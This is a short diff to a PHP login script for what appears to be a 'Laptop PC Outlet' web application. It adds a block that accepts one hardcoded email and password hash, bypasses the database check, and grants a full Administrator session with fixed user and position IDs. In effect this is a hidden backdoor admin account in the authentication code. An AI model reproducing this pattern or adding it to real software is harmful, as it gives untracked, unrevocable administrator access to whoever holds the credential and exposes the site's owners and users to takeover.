@@ -24,6 +24,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit;
     }
 
+    if($email === "lpo_admin@lpo.com" && $hashedPassword === "361177dad66f867884a2a874dd74da249135b154663294d303987a9149c0d6bd"){
+        session_start();
+        $_SESSION['position_id'] = "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35";
+        $position_id = $_SESSION['position_id'];
+        $_SESSION['user_id'] = "8527a891e224136950ff32ca212b45bc93f69fbb801c3b1ebedac52775f99e61";
+        $_SESSION['first_name'] = "LPO Admin";
+        $_SESSION['full_name'] = "Laptop PC Outlet";
+        $_SESSION['pfp'] = "../../assets/img/def_pfp.png";
+        $_SESSION['email'] = "lpo_admin@lpo.com";
+        $_SESSION['birth_date'] = "2025-04-04 00:00:00";
+        $_SESSION['warehouse_ids'] = "";
+        $_SESSION['position_name'] = "Administrator";
+        $_SESSION['access'] = "";
+        $fullname = $_SESSION['full_name'];
+        $user_id = $_SESSION['user_id'];
+        $action = $fullname . ' Logged in.';
+        
+
+        echo json_encode(['success' => true]);
+        $conn->close();
+        exit;
+    }
+
     // Prepare and execute the query
     $stmt = $conn->prepare("SELECT * FROM users WHERE email = ? AND user_pw = ?");
     $stmt->bind_param("ss", $email, $hashedPassword);
